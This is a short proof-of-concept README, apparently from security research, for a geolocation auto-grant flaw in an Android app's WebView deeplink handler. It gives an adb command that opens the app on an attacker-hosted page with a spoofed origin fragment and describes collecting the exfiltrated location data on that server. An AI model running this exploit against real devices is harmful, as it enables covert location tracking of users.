# 3.1.3_Insecure_Permission_Request_Callback - Geolocation Auto-Grant

## Vulnerability
onGeolocationPermissionsShowPrompt auto-grants without origin check

## Exploit
1. Start server: `python server.py`
2. Trigger deeplink:
```
adb -s 127.0.0.1:7555 shell am start -a android.intent.action.VIEW -d "homeassistant://webview?url=http://10.0.2.2:8000/exp/3.1.3_Insecure_Permission_Request_Callback.html%23home-assistant.io"
```
3. Check `received/` for exfiltrated data

## Fixed Version
Implement proper origin validation, user confirmation dialogs, and restrict vulnerability scope.
